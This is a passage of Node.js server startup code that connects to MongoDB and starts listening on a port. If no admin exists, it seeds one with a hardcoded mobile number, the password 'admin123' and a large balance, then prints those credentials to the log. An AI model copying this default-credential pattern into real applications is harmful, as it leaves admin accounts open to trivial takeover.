    console.error("CRITICAL ERROR: MONGODB_URI environment variable missing!");
    process.exit(1);
  }
  try {
    await mongoose.connect(MONGO_URI);
    console.log("MongoDB Atlas Connected Successfully");
    
    const admin = await User.findOne({ mobile: '9005041462' });
    if (!admin) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      await User.create({ name: 'Admin Boss', mobile: '9005041462', password: hashedPassword, role: 'admin', balance: 999999 });
      console.log("Admin account created: 9005041462 / admin123");
    }

    server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  } catch (err) {
    console.error("Database connection failed:", err.message);
    process.exit(1);
  }
}
startServer();
